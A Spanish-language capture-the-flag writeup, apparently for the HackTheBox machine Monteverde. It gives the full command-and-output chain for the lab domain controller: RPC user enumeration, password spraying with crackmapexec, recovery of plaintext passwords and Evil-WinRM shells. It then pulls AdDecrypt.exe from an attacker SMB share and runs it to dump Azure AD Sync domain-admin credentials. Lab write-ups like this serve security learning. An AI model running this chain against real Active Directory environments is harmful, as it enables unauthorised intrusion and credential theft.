---
layout      : post
title       : "Maquina Monteverde - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Monteverde/monteverde.png
category    : [ hackthebox ]
tags        : [ Active Directory, RPC Enumeration, Crackmapexec Brute Force, Abusing WinRM, Abusing Azure Admins Group, Azure AD Sync ]
---

El dia de hoy vamos a resolver `Monteverde` de `hackthebox` una maquina `windows` de dificultad media, para esta ocasión vamos a volver a enfrentarnos contra un `DC` donde obtendremos usuarios a traves de `rpc` y con ayuda de `crackmapexec` mediante un ataque de fuerza bruta conseguiremos credenciales validas, que nos permitiran listar los recursos compartidos del sistema y conectarnos con otras credenciales al sistema y finalmente abusaremos del grupo `Azure Admins` para explotar un `Azure AD Sync` con lo que nos haremos con las credenciales administrativas del dominio. 
    
 Maquina interesenta asi que vamos a darle!.

Comenzamos como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Monteverde
❯ ls

 Monteverde
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.172
PING 10.10.10.172 (10.10.10.172) 56(84) bytes of data.
64 bytes from 10.10.10.172: icmp_seq=1 ttl=127 time=147 ms

--- 10.10.10.172 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 147.473/147.473/147.473/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `127` y por proximidad seria correspondiente a una maquina `windows`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.172 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-13 17:17 -05
Initiating SYN Stealth Scan at 17:17
Scanning 10.10.10.172 [65535 ports]
Discovered open port 139/tcp on 10.10.10.172
Discovered open port 53/tcp on 10.10.10.172
Discovered open port 445/tcp on 10.10.10.172
Discovered open port 135/tcp on 10.10.10.172
Discovered open port 49676/tcp on 10.10.10.172
Discovered open port 593/tcp on 10.10.10.172
Discovered open port 49667/tcp on 10.10.10.172
Discovered open port 49674/tcp on 10.10.10.172
Discovered open port 9389/tcp on 10.10.10.172
Discovered open port 5985/tcp on 10.10.10.172
Discovered open port 3269/tcp on 10.10.10.172
Discovered open port 636/tcp on 10.10.10.172
Discovered open port 464/tcp on 10.10.10.172
Discovered open port 49673/tcp on 10.10.10.172
Discovered open port 64934/tcp on 10.10.10.172
Discovered open port 389/tcp on 10.10.10.172
Discovered open port 88/tcp on 10.10.10.172
Discovered open port 49697/tcp on 10.10.10.172
Discovered open port 3268/tcp on 10.10.10.172
Completed SYN Stealth Scan at 17:18, 40.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.172
Host is up, received user-set (0.18s latency).
Scanned at 2023-10-13 17:17:44 -05 for 40s
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
64934/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.80 seconds
           Raw packets sent: 196591 (8.650MB) | Rcvd: 39 (1.716KB)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49697,64934 10.10.10.172 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-13 17:19 -05
Nmap scan report for 10.10.10.172
Host is up (0.66s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-13 22:19:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
64934/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-10-13T22:20:53
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.74 seconds
```

Entre los puertos abiertos mas relevantes podemos visualizar:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 53     | DNS     |  Simple DNS Plus|
| 88     | KERBEROS     |  Microsoft Windows Kerberos |
| 135   |  MSRPC     |  Microsoft Windows RPC  |
| 139   | NETBIOS     |  Microsoft Windows netbios-ssn|
| 445   |   SMB   | ?  |
| 3268   |   LDAP   |  Microsoft Windows Active Directory LDAP  |
| 5985   |  WINRM    | Microsoft HTTPAPI httpd 2.0   |



## EXPLOTACION [#](#explotacion) {#explotacion}

Como vemos que el puerto `445` esta abierto, con `crackpamexec` vamos a tratar de enumerar a lo que nos enfrentamos.

```bash
❯ crackmapexec smb 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

Podemos ver que estamos ante un `Windows 10`, ahora tambien vemos el dominio asociado para agregarlo a nuestro `/etc/hosts`.

```bash
❯ echo "10.10.10.172 MEGABANK.LOCAL" >> /etc/hosts
```

Como nos enfrentamos contra un `Domain Controller` podemos tratar de enumerar usuarios validos con `rpclient` a traves de un `null session`.

```bash
❯ rpcclient -U '' 10.10.10.172 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]'
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
Guardamos las credenciales en un archivo de nombre `users.txt` y podemos tratar de efectuar un `ASREProast Attack` para tratar de obtener un `TGT - ticket granting ticket`, pero no da resultado.

```bash
❯ GetNPUsers.py -no-pass -usersfile users.txt MEGABANK.LOCAL/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Ahora bien en vista que tenemos un listado potencial de usuarios validos podemos tratar de realizar fuerza bruta con `crackmapexec` usando la misma lista de usuarios como posibles contraseñas.

```bash
❯ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-netapp STATUS_LOGON_FAILURE 
```

Obtenemos unas credenciales validas `SABatchJobs:SABatchJobs` y con estas podemos tratar de enumerar los recursos compartidos.


```bash
❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
[+] IP: 10.10.10.172:445	Name: MEGABANK.LOCAL                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY	
```


Si vamos a las ruta de `users$` encontramos dentro del directorio `mhope` un archivo `azure.xml`.

```bash
❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$/mhope'
[+] IP: 10.10.10.172:445	Name: MEGABANK.LOCAL                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	users$                                            	READ ONLY	
	.\users$mhope\*
	dr--r--r--                0 Fri Jan  3 08:41:18 2020	.
	dr--r--r--                0 Fri Jan  3 08:41:18 2020	..
	fw--w--w--             1212 Fri Jan  3 09:59:24 2020	azure.xml
```

Nos descargamos el archivo y al leerlo vemos una nueva contraseña `4n0therD4y@n0th3r$`

```bash
❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --download 'users$/mhope/azure.xml'
[+] Starting download: users$\mhope\azure.xml (1212 bytes)
[+] File output to: /home/fmiracle/machines/Monteverde/content/10.10.10.172-users_mhope_azure.xml
❯ mv 10.10.10.172-users_mhope_azure.xml azure.xml
❯ /bin/cat azure.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>#
```

Ya que obtuvimos una nueva credencial, vamos a hacer lo mismo que antes con `Crackmapexec` pero esta vez con esta contraseña.

```bash
❯ crackmapexec smb 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
```

Obtenemos nuevas credenciales validas `mhope:4n0therD4y@n0th3r$` y como vimos que el puerto `5085` se encuentra abierto, podemos tratar de conectarnos con `evil-winrm`


```bash
❯ evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
```

Una vez como el usuario `mhpe`, podemos dirigirnos a su directorio personal y visualizar la primera flag `user.txt`.

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
603f2f5e0f8e217d541fb0572da2d55c
```

## ELEVACION DE PRIVILEGIOS [#](#elevacion-de-privilegios) {#elevacion-de-privilegios}

Si listamos los grupos a los cuales pertenece el usuario `mhope`, podemos notar que esta dentro del grupo `Azure admins`

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   10/13/2023 3:52:10 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```


Cuando un usuario pertenece a un grupo `Azure` debemos de dirigirnos al directorio raiz, y dentro buscar directorios relacionados a `Azure`.

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> cd C:\
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---         1/3/2020   5:28 AM                Program Files
d-----         1/2/2020   2:39 PM                Program Files (x86)
d-r---         1/3/2020   5:24 AM                Users
d-----       10/25/2022   2:29 AM                Windows


*Evil-WinRM* PS C:\> cd Progra~1
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell
```

Curiosamente vemos uno de nombre `Microsoft Azure AD Sync`, y si investigamos un poco, encontramos un exploit de escalada de privilegios, que lo que hace concretamente es dumpear las credenciales del administrador del dominio.


Te dejo aqui el articulo para que veas mas al respecto:

* [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)


Lo que tenemos que hacer primero es descargarnos el `AdDecrypt.zip` del repositorio de `github`.

* [https://github.com/VbScrub/AdSyncDecrypt/releases](https://github.com/VbScrub/AdSyncDecrypt/releases)

Lo descomprimimos y dentro vamos a tener dos archivos los cuales tenemos que subir a la maquina victima.

```bash
❯ ls
 AdDecrypt.zip   azure.xml   credentials.txt   users.txt
❯ unzip AdDecrypt.zip
Archive:  AdDecrypt.zip
  inflating: AdDecrypt.exe           
  inflating: mcrypt.dll              
❯ ls
 AdDecrypt.exe   AdDecrypt.zip   azure.xml   credentials.txt   mcrypt.dll   users.txt
```

Nos creamos un directorio y subimos los archivos, lo que yo hare es que con `smbserver` crearme un recurso compartido para subirlos, pero puedes hacerlo como quieras.

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> mkdir Privesc
*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc> copy \\10.10.16.10\smbFolder\AdDecrypt.exe AdDecrypt.exe
*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc> copy \\10.10.16.10\smbFolder\mcrypt.dll mcrypt.dll
*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc> dir

    Directory: C:\Users\mhope\Desktop\Privesc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/13/2020   9:11 PM          14848 AdDecrypt.exe
-a----        1/12/2020   6:33 PM         334248 mcrypt.dll
```

Finalmente debemos ejecutar el siguiente comando `AdDecrypt.exe -FullSQL`, pero debemos hacerlo desde el siguiente directorio `C:\Program Files\Microsoft Azure AD Sync\Bin`.

Ahora recordemos que debemos ejecutar el `AdSyncDecrypt.exe` desde la ruta donde lo subimos.

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Desktop\Privesc\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

Validamos las credenciales administrativas `administrator:d0m@in4dminyeah!`.

```bash
❯ crackmapexec smb 10.10.10.172 -u 'administrator' -p 'd0m@in4dminyeah!'
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!)
```

Nos conectamos como el usuario `administrator` con `Evil-WinRM` y podemos visualizar la segunda flag `root.txt`.

```bash
❯ evil-winrm -i 10.10.10.172 -u 'administrator' -p 'd0m@in4dminyeah!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
6154d420f50cd70c919a6fb1e96e56fc
```

y listo maquina finiquitada! 😆
